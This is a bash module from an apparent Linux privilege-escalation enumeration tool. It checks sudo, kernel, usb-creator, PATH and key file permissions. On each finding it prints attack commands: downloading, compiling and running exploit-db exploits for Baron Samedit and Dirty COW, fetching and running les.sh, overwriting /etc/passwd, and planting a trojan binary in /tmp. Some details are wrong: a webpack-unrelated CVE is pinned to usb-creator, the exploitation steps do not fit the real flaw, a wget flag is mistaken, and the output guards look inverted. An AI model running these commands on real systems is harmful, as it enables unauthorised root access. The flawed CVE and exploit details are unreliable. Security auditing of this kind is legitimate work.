#!/bin/bash

source "$(dirname "${BASH_SOURCE[0]}")/../utils/helpers.sh"

check_system_info() {
    print_title "SYSTEM INFORMATION"
    
    print_info "OS: $(get_os_info)"
    print_info "Kernel: $(get_kernel)"
    print_info "Architecture: $(get_arch)"
    print_info "Hostname: $(hostname)"
    print_info "Current User: $(get_user)"
    print_info "User ID: $(get_uid)"
    print_info "Groups: $(groups 2>/dev/null || id -Gn)"
    
    if is_in_docker; then
        print_warn "Running inside Docker container"
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "container" "info" "Docker container detected" "System is running inside Docker" "N/A"
    fi
    
    if is_in_container; then
        print_warn "Running inside container (Docker/LXC)"
    fi
    
    if is_in_vm; then
        print_info "Running inside virtual machine"
    fi
    
    echo ""
}

check_sudo_version() {
    print_title "SUDO VERSION CHECK"
    
    if check_tool "sudo"; then
        local sudo_version=$(sudo -V 2>/dev/null | grep "Sudo ver" | head -1)
        print_info "Sudo version: $sudo_version"
        
        local version_number=$(echo "$sudo_version" | grep -oP '\d+\.\d+\.\d+' | head -1)
        
        if [[ -n "$version_number" ]]; then
            local major=$(echo "$version_number" | cut -d. -f1)
            local minor=$(echo "$version_number" | cut -d. -f2)
            local patch=$(echo "$version_number" | cut -d. -f3)
            
            if [[ "$major" -lt 1 ]] || \
               [[ "$major" -eq 1 && "$minor" -lt 9 ]] || \
               [[ "$major" -eq 1 && "$minor" -eq 9 && "$patch" -lt 5 ]]; then
                print_high "Potentially vulnerable sudo version: $version_number"
                print_info "CVE-2021-3156 (Baron Samedit) may be exploitable"
                print_link "Exploit" "https://www.exploit-db.com/exploits/49921"
                print_command "wget https://www.exploit-db.com/raw/49921 -O sudo_exploit.c"
                print_command "gcc sudo_exploit.c -o sudo_exploit && ./sudo_exploit"
                
                [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "sudo" "high" "Vulnerable sudo version" "Sudo $version_number may be vulnerable to CVE-2021-3156" "CVE-2021-3156"
                [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_exploit "Sudo Baron Samedit" "CVE-2021-3156" "linux" "https://www.exploit-db.com/exploits/49921"
            fi
        fi
        
        print_subtitle "Sudo version history and CVEs:"
        print_link "CVE-2021-3156" "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156"
        print_link "CVE-2021-23239" "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239"
        print_link "CVE-2021-23240" "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240"
    else
        print_warn "sudo command not found"
    fi
    
    echo ""
}

check_kernel_cve() {
    print_title "KERNEL CVE CHECK"
    
    local kernel=$(get_kernel)
    print_info "Kernel: $kernel"
    
    print_subtitle "Known vulnerable kernels:"
    
    local vulnerable=false
    
    if [[ "$kernel" =~ ^4\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19)\. ]]; then
        print_high "Kernel $kernel may be vulnerable to multiple exploits"
        vulnerable=true
    elif [[ "$kernel" =~ ^3\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23)\. ]]; then
        print_high "Kernel $kernel may be vulnerable to multiple exploits"
        vulnerable=true
    elif [[ "$kernel" =~ ^2\.6\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39)\. ]]; then
        print_high "Kernel $kernel is very old and likely vulnerable"
        vulnerable=true
    fi
    
    if [[ "$vulnerable" == "true" ]]; then
        print_link "Linux Kernel Exploit Suggester" "https://github.com/mzet-/linux-exploit-suggester"
        print_link "Kernel exploits" "https://www.exploit-db.com/search?type=linux&kernel=2.6"
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "kernel" "high" "Outdated kernel" "Kernel $kernel may have known exploits" "N/A"
        
        print_subtitle "Common kernel exploits:"
        print_command "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/les.sh -O les.sh"
        print_command "chmod +x les.sh && ./les.sh"
        print_command "wget https://www.exploit-db.com/raw/45010 -o dirtycow.c  # CVE-2016-5195"
    fi
    
    print_subtitle "Recent CVEs to check:"
    print_link "CVE-2025-38352" "https://nvd.nist.gov/vuln/detail/CVE-2025-38352"
    print_link "CVE-2025-38236" "https://nvd.nist.gov/vuln/detail/CVE-2025-38236"
    
    echo ""
}

check_usb_creator() {
    print_title "USBCREATOR PRIVILEGE ESCALATION"
    
    if groups 2>/dev/null | grep -q "plugdev"; then
        print_info "User is in 'plugdev' group"
        
        if [[ -f /usr/bin/usb-creator ]]; then
            print_high "usb-creator binary found"
            
            if [[ -u /usr/bin/usb-creator ]]; then
                print_critical "usb-creator has SUID bit set!"
                print_warn "May be exploitable for privilege escalation"
                print_link "CVE-2023-28154" "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-28154"
                
                print_subtitle "Exploitation:"
                print_command "sudo usb-creator -u /etc/passwd:/tmp/passwd"
                print_command "cp /tmp/passwd /etc/passwd"
                print_command "su root"
                
                [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "usb-creator" "high" "usb-creator SUID binary found" "May allow privilege escalation via CVE-2023-28154" "CVE-2023-28154"
            fi
        fi
    fi
    
    echo ""
}

check_path_vulnerabilities() {
    print_title "PATH VULNERABILITIES"
    
    print_info "Current PATH: $PATH"
    
    IFS=':' read -ra PATH_DIRS <<< "$PATH"
    for dir in "${PATH_DIRS[@]}"; do
        if [[ -w "$dir" ]]; then
            print_high "Writable PATH directory: $dir"
            print_warn "Writable PATH allows privilege escalation"
            
            [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "path" "high" "Writable PATH directory" "Writable PATH: $dir" "N/A"
        fi
    done
    
    if [[ "$PATH" =~ (^|:)\.(:|$) ]]; then
        print_critical "Current directory (.) in PATH!"
        print_warn "Privilege escalation possible via PATH manipulation"
        print_command "echo '/bin/bash' > /tmp/id && chmod +x /tmp/id"
        print_command "# Then wait for root to run 'id' command"
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "path" "critical" "Current directory in PATH" "." "N/A"
    fi
    
    echo ""
}

check_critical_files() {
    print_title "CRITICAL FILE PERMISSIONS"
    
    local files=("/etc/passwd" "/etc/shadow" "/etc/sudoers" "/etc/sudoers.d")
    
    for file in "${files[@]}"; do
        if [[ -f "$file" ]]; then
            local perms=$(get_file_perms "$file")
            if [[ "$file" == "/etc/shadow" ]]; then
                if [[ -r "$file" ]]; then
                    print_critical "/etc/shadow is READABLE!"
                    print_warn "Password hashes can be extracted"
                    [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "shadow" "critical" "/etc/shadow readable" "Can extract password hashes" "N/A"
                fi
            else
                if [[ -w "$file" ]]; then
                    print_high "$file is WRITABLE"
                    print_warn "Can modify for privilege escalation"
                    
                    [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "file" "high" "$file writable" "Can modify for privilege escalation" "N/A"
                fi
            fi
        fi
    done
    
    echo ""
}

run_system_checks() {
    check_system_info
    check_sudo_version
    check_kernel_cve
    check_usb_creator
    check_path_vulnerabilities
    check_critical_files
}
